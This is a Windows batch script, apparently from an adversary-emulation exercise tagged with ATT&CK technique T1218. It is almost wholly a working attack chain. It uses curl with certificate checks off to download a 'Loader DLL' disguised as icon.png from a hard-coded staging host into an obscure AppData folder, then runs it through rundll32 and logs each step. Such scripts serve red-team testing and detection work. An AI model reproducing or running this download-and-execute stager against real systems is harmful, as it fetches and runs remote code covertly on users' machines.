@echo off
SETLOCAL EnableDelayedExpansion

REM Declare random-named SET variables for all PHR placeholders
SET wruygn=%APPDATA%\10598\09c4ddc1
SET zpqvlfa=d43f2814.txt
SET kxctpwi=https://10.0.0.49/stage/2/icon.png?10598-7
SET bcqdzup=BALAM-S2B
SET fnhxkpr=10598
SET jmeodts=7
SET luqgiwv=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logs
SET tsvar=%DATE%/%TIME%

REM Step 1: Heartbeat fetch (downloads the Loader DLL)
echo [!tsvar!][DEBUG][!bcqdzup!][!fnhxkpr!]: heartbeat_start>> "!luqgiwv!" 2>nul
curl -k -s -o "!wruygn!\!zpqvlfa!" "!kxctpwi!"
set ecode=!errorlevel!
echo [!tsvar!][DEBUG][!bcqdzup!][!fnhxkpr!]: heartbeat_complete=!ecode!>> "!luqgiwv!" 2>nul

REM Step 2: Change to output directory
echo [!tsvar!][DEBUG][!bcqdzup!][!fnhxkpr!]: chdir_start>> "!luqgiwv!" 2>nul
cd /d "!wruygn!"
set ecode=!errorlevel!
echo [!tsvar!][DEBUG][!bcqdzup!][!fnhxkpr!]: chdir_result=!ecode!>> "!luqgiwv!" 2>nul

REM Step 3: LOLBIN invocation of the downloaded Loader DLL
echo [!tsvar!][DEBUG][!bcqdzup!][!fnhxkpr!]: rundll32_start>> "!luqgiwv!" 2>nul
rundll32.exe "!zpqvlfa!", RunDLLW
set ecode=!errorlevel!

REM Log TTP execution
if exist "!wruygn!\!zpqvlfa!" (
    if !ecode! equ 0 (
        echo [%date% %time%][TTP][!bcqdzup!][!fnhxkpr!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!luqgiwv!" 2>nul
    ) else (
        echo [%date% %time%][TTP][!bcqdzup!][!fnhxkpr!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "!luqgiwv!" 2>nul
    )
)

ENDLOCAL